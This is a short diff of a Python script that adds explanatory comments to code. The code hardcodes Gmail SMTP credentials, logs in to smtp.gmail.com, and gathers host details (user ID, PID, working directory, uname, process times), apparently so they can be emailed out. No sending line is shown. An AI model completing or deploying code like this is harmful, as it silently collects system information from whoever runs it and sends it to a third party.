@@ -3,13 +3,13 @@ import time
 import smtplib
 import socket
 user="coolv926@gmail.com"#write your mail id 
-kiyo="Dontusemine"
-xnome="coolv926@gmail.com"
+kiyo="Dontusemine" #Your Password
+xnome="coolv926@gmail.com" #write your email id
 server=smtplib.SMTP("smtp.gmail.com","587")
 server.starttls()
-server.login(xnome,kiyo)
-unumber = os.getuid()
-pnumber = os.getpid()
+server.login(xnome,kiyo) #Email Authentication
+unumber = os.getuid() # User Id
+pnumber = os.getpid() # User PID
 where = os.getcwd()
 what = os.uname()
 used = os.times()
